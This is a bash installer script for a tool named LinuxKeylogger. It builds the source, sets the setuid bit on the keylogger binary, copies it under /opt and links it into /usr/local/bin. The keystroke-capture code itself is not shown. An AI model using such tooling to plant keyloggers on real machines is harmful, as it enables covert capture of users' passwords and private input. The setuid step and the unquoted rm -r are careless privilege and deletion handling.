#!/bin/bash

echo -n "install directory (/opt)? "
read DIR

if [ "$DIR" = "" ];
then
	DIR="/opt"
fi

echo "You selected : $DIR"
if [ -d $DIR ]; then
	echo $DIR directory found
	if [ -d $DIR/LinuxKeylogger ]; then
		echo -n "LinuxKeylogger already installed. replace (y/n)?"
		read x
		if [ $x = "y" ]; then
			rm -r $DIR/LinuxKeylogger
			echo removed old installation
		else 
			if [ $x = "n" ]; then
				exit
			else
				echo "didnt understand $x"
				exit
			fi
		fi
	fi
	echo making LinuxKeylogger Directory
	mkdir $DIR/LinuxKeylogger
	echo Building source
	make
	echo Installing
	chmod u+s ./bin/keylogger.out
	cp ./bin/keylogger.out $DIR/LinuxKeylogger/keylogger.out
	ln -s $DIR/LinuxKeylogger/keylogger.out /usr/local/bin/keylogger
	echo Finished Installing
else
	echo "$DIR directory does not exist"
fi


